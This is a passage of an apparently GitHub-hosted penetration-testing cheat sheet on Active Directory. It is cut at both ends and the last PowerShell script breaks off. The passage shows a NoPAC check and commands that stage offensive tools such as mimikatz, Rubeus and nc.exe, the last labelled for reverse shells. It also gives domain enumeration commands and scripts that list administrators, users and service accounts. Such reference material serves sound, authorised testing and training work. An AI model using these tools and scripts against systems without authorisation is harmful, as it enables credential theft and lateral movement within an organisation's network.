class=\"pl-c\"\u003e#\u003c/span\u003e NoPAC (requires credentials)\u003c/span\u003e\ncrackmapexec smb DC_IP -u \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003euser\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e -p \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003epass\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e -M nopac\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eBefore starting enumeration, get the tools you might need ready:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# WinPEAS for automated Windows enumeration\nwget -O winpeas.exe https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe\n\n# PowerUp for Winodws privilege escalation\ncp /usr/share/powershell-empire/empire/server/data/module_source/privesc/PowerUp.ps1 .\n\n# PowerView for manual AD enumeration\ncp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 .\nchmod -x PowerView.ps1\n\n# SharpHound for automated AD enumeration\nwget https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1\n\n# sysinternals suite in case you need it\nwget -O sysinternals.zip https://download.sysinternals.com/files/SysinternalsSuite.zip\nunzip -d sysinternals sysinternals.zip\n\n# Invoke-Mimikatz.ps1 and mimikatz.exe for hashes/tokens\ncp /usr/share/windows-resources/powersploit/Exfiltration/Invoke-Mimikatz.ps1 .\ncp /usr/share/windows-resources/mimikatz/Win32/mimikatz.exe ./mimikatz32.exe\ncp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe ./mimikatz64.exe\nwget -O mimikatz.zip https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip\nunzip -d mimikatz mimikatz.zip\n\n# Rubeus.exe for AS-REP roasting, etc.\nwget -O Rubeus.exe https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe\n\n# windapsearch for LDAP enumeration\nwget -O windapsearch https://github.com/ropnop/go-windapsearch/releases/latest/download/windapsearch-linux-amd64\nchmod +x windapsearch\n\n# plink.exe for port redirection/tunneling\ncp /usr/share/windows-resources/binaries/plink.exe .\nchmod -x plink.exe\n\n# nc.exe for reverse/bind shells and port redirection\ncp /usr/share/windows-resources/binaries/nc.exe .\nchmod -x nc.exe\n\n# chisel for port redirection/tunneling\n/mnt/share/cheat/tools/get-chisel.sh || (\n\techo 'DOWNLOAD chisel!'\n\techo 'https://github.com/jpillora/chisel/releases'\n)\n\n# host the files on a Windows 10+ compatible SMB share\nimpacket-smbserver -smb2support -user derp -password herpderp share .\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e WinPEAS for automated Windows enumeration\u003c/span\u003e\nwget -O winpeas.exe https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e PowerUp for Winodws privilege escalation\u003c/span\u003e\ncp /usr/share/powershell-empire/empire/server/data/module_source/privesc/PowerUp.ps1 \u003cspan class=\"pl-c1\"\u003e.\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e PowerView for manual AD enumeration\u003c/span\u003e\ncp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 \u003cspan class=\"pl-c1\"\u003e.\u003c/span\u003e\nchmod -x PowerView.ps1\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e SharpHound for automated AD enumeration\u003c/span\u003e\nwget https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e sysinternals suite in case you need it\u003c/span\u003e\nwget -O sysinternals.zip https://download.sysinternals.com/files/SysinternalsSuite.zip\nunzip -d sysinternals sysinternals.zip\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Invoke-Mimikatz.ps1 and mimikatz.exe for hashes/tokens\u003c/span\u003e\ncp /usr/share/windows-resources/powersploit/Exfiltration/Invoke-Mimikatz.ps1 \u003cspan class=\"pl-c1\"\u003e.\u003c/span\u003e\ncp /usr/share/windows-resources/mimikatz/Win32/mimikatz.exe ./mimikatz32.exe\ncp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe ./mimikatz64.exe\nwget -O mimikatz.zip https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip\nunzip -d mimikatz mimikatz.zip\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Rubeus.exe for AS-REP roasting, etc.\u003c/span\u003e\nwget -O Rubeus.exe https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e windapsearch for LDAP enumeration\u003c/span\u003e\nwget -O windapsearch https://github.com/ropnop/go-windapsearch/releases/latest/download/windapsearch-linux-amd64\nchmod +x windapsearch\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e plink.exe for port redirection/tunneling\u003c/span\u003e\ncp /usr/share/windows-resources/binaries/plink.exe \u003cspan class=\"pl-c1\"\u003e.\u003c/span\u003e\nchmod -x plink.exe\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e nc.exe for reverse/bind shells and port redirection\u003c/span\u003e\ncp /usr/share/windows-resources/binaries/nc.exe \u003cspan class=\"pl-c1\"\u003e.\u003c/span\u003e\nchmod -x nc.exe\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e chisel for port redirection/tunneling\u003c/span\u003e\n/mnt/share/cheat/tools/get-chisel.sh \u003cspan class=\"pl-k\"\u003e||\u003c/span\u003e (\n\t\u003cspan class=\"pl-c1\"\u003eecho\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eDOWNLOAD chisel!\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\n\t\u003cspan class=\"pl-c1\"\u003eecho\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003ehttps://github.com/jpillora/chisel/releases\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\n)\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e host the files on a Windows 10+ compatible SMB share\u003c/span\u003e\nimpacket-smbserver -smb2support -user derp -password herpderp share \u003cspan class=\"pl-c1\"\u003e.\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eManual enumeration commands:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# What Active Directory Domain you belong to\nwmic computersystem get domain\nsysteminfo | findstr /B /C:\u0026quot;Domain\u0026quot;\n\n# Which Domain Controller you're authenticated to (logonserver)\nset l\nnltest /dsgetdc:DOMAIN.TLD\n\n# View Domain Users\nnet user /domain\n\n# View info about specific domain user\nnet user derpadmin /domain\n\n# View Domain Groups\nnet group /domain\n\n# View Members of specific Domain Group\n# (examples are valuable default groups)\nnet group /domain \u0026quot;Domain Admins\u0026quot;\nnet group /domain \u0026quot;Enterprise Admins\u0026quot;\nnet group /domain \u0026quot;Domain Controllers\u0026quot; # which machines the DCs are\nnet group /domain \u0026quot;Domain Computers\u0026quot; # all computers in the domain\nnet group /domain \u0026quot;Administrators\u0026quot;\nnet group /domain \u0026quot;Remote Desktop Users\u0026quot;\nnet group /domain \u0026quot;Remote Management Users\u0026quot;\n\n# View high-level info about current domain\n[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()\n\n# view info about primary DC\n[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner\n\n# look up info on specific service account\nsetspn -L iis_service\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e What Active Directory Domain you belong to\u003c/span\u003e\nwmic computersystem get domain\nsysteminfo \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e findstr \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eB \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eC:\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eDomain\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Which Domain Controller you're authenticated to (logonserver)\u003c/span\u003e\nset l\nnltest \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003edsgetdc:DOMAIN.TLD\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e View Domain Users\u003c/span\u003e\nnet user \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003edomain\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e View info about specific domain user\u003c/span\u003e\nnet user derpadmin \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003edomain\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e View Domain Groups\u003c/span\u003e\nnet group \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003edomain\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e View Members of specific Domain Group\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e (examples are valuable default groups)\u003c/span\u003e\nnet group \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003edomain \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eDomain Admins\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\nnet group \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003edomain \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eEnterprise Admins\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\nnet group \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003edomain \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eDomain Controllers\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e which machines the DCs are\u003c/span\u003e\nnet group \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003edomain \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eDomain Computers\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e all computers in the domain\u003c/span\u003e\nnet group \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003edomain \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eAdministrators\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\nnet group \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003edomain \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eRemote Desktop Users\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\nnet group \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003edomain \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eRemote Management Users\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e View high-level info about current domain\u003c/span\u003e\n[\u003cspan class=\"pl-k\"\u003eSystem.DirectoryServices.ActiveDirectory.Domain\u003c/span\u003e]::GetCurrentDomain()\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e view info about primary DC\u003c/span\u003e\n[\u003cspan class=\"pl-k\"\u003eSystem.DirectoryServices.ActiveDirectory.Domain\u003c/span\u003e]::GetCurrentDomain().PdcRoleOwner\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e look up info on specific service account\u003c/span\u003e\nsetspn \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eL iis_service\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eOne-liner to list local administrators on another computer (you must be admin of that computer to do so):\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# change COMPUTERNAME to whatever\nGet-CimInstance -Computer COMPUTERNAME -Class Win32_GroupUser|?{$_.GroupComponent.Name -eq \u0026quot;Administrators\u0026quot;}|%{$_.PartComponent.Name}\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e change COMPUTERNAME to whatever\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eGet-CimInstance\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eComputer COMPUTERNAME \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eClass Win32_GroupUser\u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e?\u003c/span\u003e{\u003cspan class=\"pl-c1\"\u003e$_\u003cspan class=\"pl-smi\"\u003e.GroupComponent.Name\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-eq\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eAdministrators\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e}\u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e{\u003cspan class=\"pl-c1\"\u003e$_\u003cspan class=\"pl-smi\"\u003e.PartComponent.Name\u003c/span\u003e\u003c/span\u003e}\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eHere's a quick script to list the local administrators of all hosts in a domain:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"$LocalGroup = 'Administrators'\n$pdc=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner;\n$dn=([adsi]'').distinguishedName\n$p=(\u0026quot;LDAP://\u0026quot;+$pdc.Name+\u0026quot;/\u0026quot;+$dn);\n$d=New-Object System.DirectoryServices.DirectoryEntry($p)\n$s=New-Object System.DirectoryServices.DirectorySearcher($d)\n$s.filter=\u0026quot;(objectCategory=computer)\u0026quot;\n$computers=$s.FindAll()|%{$_.Properties.cn}\nforeach ($c in $computers) {\n  echo \u0026quot;`r`n==========   $c   ==========\u0026quot;\n  try {\n    $grp=[ADSI](\u0026quot;WinNT://$c/$LocalGroup,Group\u0026quot;)\n    $mbrs=$grp.PSBase.Invoke('Members')\n    $mbrs|%{$_.GetType().InvokeMember('Name','GetProperty',$null,$_,$null)}\n  } catch {\n    echo \u0026quot;[x] ERROR retrieving group members\u0026quot;\n    continue\n  }\n}\"\u003e\u003cpre\u003e\u003cspan class=\"pl-smi\"\u003e$LocalGroup\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eAdministrators\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"pl-smi\"\u003e$pdc\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e[\u003cspan class=\"pl-k\"\u003eSystem.DirectoryServices.ActiveDirectory.Domain\u003c/span\u003e]::GetCurrentDomain().PdcRoleOwner;\n\u003cspan class=\"pl-smi\"\u003e$dn\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e([\u003cspan class=\"pl-k\"\u003eadsi\u003c/span\u003e]\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e).distinguishedName\n\u003cspan class=\"pl-smi\"\u003e$p\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eLDAP://\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e$pdc\u003cspan class=\"pl-smi\"\u003e.Name\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e/\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e$dn\u003c/span\u003e);\n\u003cspan class=\"pl-smi\"\u003e$d\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003eNew-Object\u003c/span\u003e System.DirectoryServices.DirectoryEntry(\u003cspan class=\"pl-smi\"\u003e$p\u003c/span\u003e)\n\u003cspan class=\"pl-smi\"\u003e$s\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003eNew-Object\u003c/span\u003e System.DirectoryServices.DirectorySearcher(\u003cspan class=\"pl-smi\"\u003e$d\u003c/span\u003e)\n\u003cspan class=\"pl-smi\"\u003e$s\u003cspan class=\"pl-smi\"\u003e.filter\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e(objectCategory=computer)\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"pl-smi\"\u003e$computers\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e$s\u003cspan class=\"pl-smi\"\u003e.FindAll\u003c/span\u003e\u003c/span\u003e()\u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e{\u003cspan class=\"pl-c1\"\u003e$_\u003cspan class=\"pl-smi\"\u003e.Properties.cn\u003c/span\u003e\u003c/span\u003e}\n\u003cspan class=\"pl-k\"\u003eforeach\u003c/span\u003e (\u003cspan class=\"pl-smi\"\u003e$c\u003c/span\u003e \u003cspan class=\"pl-k\"\u003ein\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e$computers\u003c/span\u003e) {\n  echo \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003cspan class=\"pl-cce\"\u003e`r`n\u003c/span\u003e==========   \u003cspan class=\"pl-smi\"\u003e$c\u003c/span\u003e   ==========\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n  \u003cspan class=\"pl-k\"\u003etry\u003c/span\u003e {\n    \u003cspan class=\"pl-smi\"\u003e$grp\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e[\u003cspan class=\"pl-k\"\u003eADSI\u003c/span\u003e](\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eWinNT://\u003cspan class=\"pl-smi\"\u003e$c\u003c/span\u003e/\u003cspan class=\"pl-smi\"\u003e$LocalGroup\u003c/span\u003e,Group\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e)\n    \u003cspan class=\"pl-smi\"\u003e$mbrs\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e$grp\u003cspan class=\"pl-smi\"\u003e.PSBase.Invoke\u003c/span\u003e\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eMembers\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e)\n    \u003cspan class=\"pl-smi\"\u003e$mbrs\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e{\u003cspan class=\"pl-c1\"\u003e$_\u003cspan class=\"pl-smi\"\u003e.GetType\u003c/span\u003e\u003c/span\u003e().InvokeMember(\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eName\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eGetProperty\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e$null\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e$_\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e$null\u003c/span\u003e)}\n  } \u003cspan class=\"pl-k\"\u003ecatch\u003c/span\u003e {\n    echo \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e[x] ERROR retrieving group members\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n    \u003cspan class=\"pl-k\"\u003econtinue\u003c/span\u003e\n  }\n}\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e5.1.1 Quick Active Directory Enumeration Script\u003c/h3\u003e\u003ca id=\"user-content-511-quick-active-directory-enumeration-script\" class=\"anchor\" aria-label=\"Permalink: 5.1.1 Quick Active Directory Enumeration Script\" href=\"#511-quick-active-directory-enumeration-script\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eThis script will provide a quick listing of all computers, users, service\naccounts, groups and memberships on an Active Directory domain.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eThis script was adapted from one written by Cones, who modified the example code provided in the PWK course materials.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"$pdc=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner;\n$dn=([adsi]'').distinguishedName\n$p=(\u0026quot;LDAP://\u0026quot;+$pdc.Name+\u0026quot;/\u0026quot;+$dn);\n$d=New-Object System.DirectoryServices.DirectoryEntry($p)\n$s=New-Object System.DirectoryServices.DirectorySearcher($d)\nwrite-host \u0026quot;==========    PRIMARY DC    ==========\u0026quot;;\n$pdc|select Name,IPAddress,OSVersion,SiteName,Domain,Forest|format-list\nwrite-host \u0026quot;==========    COMPUTERS    ==========\u0026quot;;\n$s.filter=\u0026quot;(objectCategory=computer)\u0026quot;;$s.FindAll()|?{write-host $_.Path};\nwrite-host \u0026quot;==========    USERS    ==========\u0026quot;;\n$s.filter=\u0026quot;(objectCategory=person)\u0026quot;;$s.FindAll()|?{write-host $_.Path};\nwrite-host \u0026quot;==========    SERVICES    ==========\u0026quot;;\n$s.filter=\u0026quot;(serviceprincipalname=*)\u0026quot;;$s.FindAll()|?{write-host $_.Path};\nwrite-host \u0026quot;==========    GROUPS    ==========\u0026quot;;\n$s.filter=\u0026quot;(objectCategory=group)\u0026quot;;$s.FindAll()|?{write-host $_.Path};\nwrite-host \u0026quot;==========    MEMBERSHIP    ==========\u0026quot;;\nfunction _r {\n  param($o,$m);\n  if ($o.Properties.member -ne $null) {\n    $lm=[System.Collections.ArrayList]@();\n    $o.Properties.member|?{$lm.add($_.split(\u0026quot;,\u0026quot;)[0].replace(\u0026quot;CN=\u0026quot;,\u0026quot;\u0026quot;))};\n    $lm=$lm|select -unique;\n    $m.add((New-Object psobject -Property @{\n      OU = $o.Properties.name[0]\n      M = [string]::Join(\u0026quot;, \u0026quot;,$lm)\n    }));\n    $lm | ?{\n      $s.filter=[string]::Format(\u0026quot;(name={0})\u0026quot;,$_);\n      $s.FindAll()|?{_r $_ $m | out-null};\n    }\n  }\n}\n$m=[System.Collections.ArrayList]@();\n$s.FindAll()|?{_r $_ $m | out-null};\n$m|sort-object OU -unique|?{write-host ([string]::Format(\u0026quot;[OU] {0}: {1}\u0026quot;,$_.OU,$_.M))};\"\u003e\u003cpre\u003e\u003cspan class=\"pl-smi\"\u003e$pdc\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e[\u003cspan class=\"pl-k\"\u003eSystem.DirectoryServices.ActiveDirectory.Domain\u003c/span\u003e]::GetCurrentDomain().PdcRoleOwner;\n\u003cspan class=\"pl-smi\"\u003e$dn\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e([\u003cspan class=\"pl-k\"\u003eadsi\u003c/span\u003e]\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e).distinguishedName\n\u003cspan class=\"pl-smi\"\u003e$p\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eLDAP://\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e$pdc\u003cspan class=\"pl-smi\"\u003e.Name\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e/\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e$dn\u003c/span\u003e);\n\u003cspan class=\"pl-smi\"\u003e$d\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003eNew-Object\u003c/span\u003e System.DirectoryServices.DirectoryEntry(\u003cspan class=\"pl-smi\"\u003e$p\u003c/span\u003e)\n\u003cspan class=\"pl-smi\"\u003e$s\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003eNew-Object\u003c/span\u003e System.DirectoryServices.DirectorySearcher(\u003cspan class=\"pl-smi\"\u003e$d\u003c/span\u003e)\n\u003cspan class=\"pl-c1\"\u003ewrite-host\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan 